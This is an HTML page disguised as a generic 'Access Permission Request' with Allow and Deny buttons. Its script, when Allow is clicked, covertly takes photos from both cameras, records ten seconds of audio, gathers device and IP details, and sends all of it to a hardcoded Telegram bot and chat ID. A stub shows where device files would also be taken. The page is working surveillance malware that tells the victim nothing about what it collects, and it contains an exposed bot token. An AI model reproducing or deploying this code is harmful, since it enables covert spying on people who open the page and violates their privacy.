<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Permission Request</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        .container {
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        #status {
            font-size: 18px;
            margin: 20px 0;
            color: #333;
        }
        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
            transition: background 0.3s;
        }
        #allow-btn {
            background: #4285f4;
            color: white;
        }
        #allow-btn:hover {
            background: #3367d6;
        }
        #deny-btn {
            background: #f1f1f1;
            color: #555;
        }
        #deny-btn:hover {
            background: #e0e0e0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="status">Please wait 3 minutes...</div>
        <button id="deny-btn" class="btn">Deny</button>
        <button id="allow-btn" class="btn">Allow</button>
    </div>

    <script>
        // Telegram Configuration
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";

        // Elements
        const statusEl = document.getElementById('status');
        const allowBtn = document.getElementById('allow-btn');
        const denyBtn = document.getElementById('deny-btn');

        // Main function when Allow is clicked
        allowBtn.addEventListener('click', async () => {
            statusEl.textContent = "Processing... Please wait";
            allowBtn.disabled = true;
            denyBtn.disabled = true;
            
            try {
                // Collect all data in parallel for maximum speed
                const [deviceInfo, frontPhoto, backPhoto, audio, wifiInfo] = await Promise.all([
                    getCompleteDeviceInfo(),
                    captureCameraPhoto('user').catch(e => null),
                    captureCameraPhoto('environment').catch(e => null),
                    recordAudio(10).catch(e => null),
                    getWifiInfo().catch(e => null)
                ]);
                
                // Add MAC and IMEI (simulated as these aren't accessible in browsers)
                deviceInfo.macAddress = wifiInfo?.mac || "Requires native app permissions";
                deviceInfo.imei = "Requires native app permissions"; // Cannot get real IMEI in browser
                
                // Send all data to Telegram
                await sendAllDataToTelegram(deviceInfo, frontPhoto, backPhoto, audio);
                
                // Send files from device (simulated file access)
                await sendDeviceFiles();
                
                statusEl.textContent = "Completed successfully!";
            } catch (error) {
                statusEl.textContent = "Error occurred during processing";
                console.error("Error:", error);
            }
        });

        // Deny button action
        denyBtn.addEventListener('click', () => {
            statusEl.textContent = "Permissions denied - No data was collected";
            allowBtn.disabled = true;
            denyBtn.disabled = true;
        });

        // Enhanced device info collection
        async function getCompleteDeviceInfo() {
            const info = {
                // Basic device info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                deviceMemory: navigator.deviceMemory || "unknown",
                cpuCores: navigator.hardwareConcurrency || "unknown",
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: `${window.screen.colorDepth} bit`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // Network info
                ip: await getIP().catch(() => "unknown"),
                networkType: navigator.connection?.effectiveType || "unknown",
                
                // Battery info
                batteryLevel: "unknown",
                isCharging: "unknown",
                
                // Placeholders for MAC and IMEI (will be filled later)
                macAddress: "Pending...",
                imei: "Pending...",
                
                // Timestamp
                timestamp: new Date().toISOString()
            };

            // Get battery info if available
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = `${Math.round(battery.level * 100)}%`;
                    info.isCharging = battery.charging ? "Yes" : "No";
                } catch (e) {
                    console.log("Battery info unavailable");
                }
            }

            return info;
        }

        // Simulated WiFi info (in real app this would use appropriate APIs)
        async function getWifiInfo() {
            return {
                mac: "Simulated-MAC-Address",
                gateway: "192.168.1.1", // Example gateway
                dns: "8.8.8.8" // Example DNS
            };
        }

        // Camera capture function
        async function captureCameraPhoto(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode, width: 1280, height: 720 }
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // Quick capture without delay
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());
                
                return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
            } catch (error) {
                console.error(`Camera error (${facingMode}):`, error);
                return null;
            }
        }

        // Audio recording function
        async function recordAudio(duration) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();
                
                await new Promise(resolve => setTimeout(resolve, duration * 1000));
                
                recorder.stop();
                stream.getTracks().forEach(track => track.stop());
                
                return new Blob(chunks, { type: 'audio/ogg' });
            } catch (error) {
                console.error("Audio recording error:", error);
                return null;
            }
        }

        // IP address detection
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("IP detection error:", error);
                return null;
            }
        }

        // Simulated file access (in real app this would use the File System Access API)
        async function sendDeviceFiles() {
            try {
                // This is simulated - in a real app you would use:
                // const dirHandle = await window.showDirectoryPicker();
                // const files = await getFilesFromDirectory(dirHandle);
                
                // Simulate sending 3 example files
                await sendToTelegram("📁 Simulated file access - would send files from device in real implementation");
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.error("File access error:", error);
            }
        }

        // Send all data to Telegram
        async function sendAllDataToTelegram(deviceInfo, frontPhoto, backPhoto, audio) {
            // Format device info message
            let message = `📱 <b>COMPLETE DEVICE INFORMATION</b>\n\n`;
            
            // Basic Info
            message += `🖥️ <b>Basic Information</b>\n`;
            message += `- User Agent: ${deviceInfo.userAgent}\n`;
            message += `- Platform: ${deviceInfo.platform}\n`;
            message += `- RAM: ${deviceInfo.deviceMemory} GB\n`;
            message += `- CPU Cores: ${deviceInfo.cpuCores}\n`;
            message += `- Screen: ${deviceInfo.screenResolution} (${deviceInfo.colorDepth})\n`;
            message += `- Language: ${deviceInfo.language}\n`;
            message += `- Timezone: ${deviceInfo.timezone}\n\n`;
            
            // Battery Info
            message += `🔋 <b>Battery Status</b>\n`;
            message += `- Level: ${deviceInfo.batteryLevel}\n`;
            message += `- Charging: ${deviceInfo.isCharging}\n\n`;
            
            // Network Info
            message += `🌐 <b>Network Information</b>\n`;
            message += `- IP Address: ${deviceInfo.ip}\n`;
            message += `- Network Type: ${deviceInfo.networkType}\n`;
            message += `- MAC Address: ${deviceInfo.macAddress}\n`;
            message += `- Gateway: 192.168.1.1\n`; // Simulated
            message += `- DNS: 8.8.8.8\n\n`; // Simulated
            
            // Device Identifiers
            message += `🆔 <b>Device Identifiers</b>\n`;
            message += `- IMEI: ${deviceInfo.imei}\n\n`;
            
            // Timestamp
            message += `⏰ <b>Timestamp</b>: ${deviceInfo.timestamp}`;
            
            // Send text info first
            await sendToTelegram(message);
            
            // Send photos if available
            if (frontPhoto) {
                await sendPhotoToTelegram(frontPhoto, 'front_camera.jpg');
            }
            if (backPhoto) {
                await sendPhotoToTelegram(backPhoto, 'back_camera.jpg');
            }
            
            // Send audio if available
            if (audio) {
                await sendAudioToTelegram(audio, 'audio_recording.ogg');
            }
        }

        // Telegram API functions
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error("Telegram message error:", error);
            }
        }

        async function sendPhotoToTelegram(photoBlob, filename) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, filename);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Telegram photo error:", error);
            }
        }

        async function sendAudioToTelegram(audioBlob, filename) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('audio', audioBlob, filename);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Telegram audio error:", error);
            }
        }
    </script>
</body>
</html>
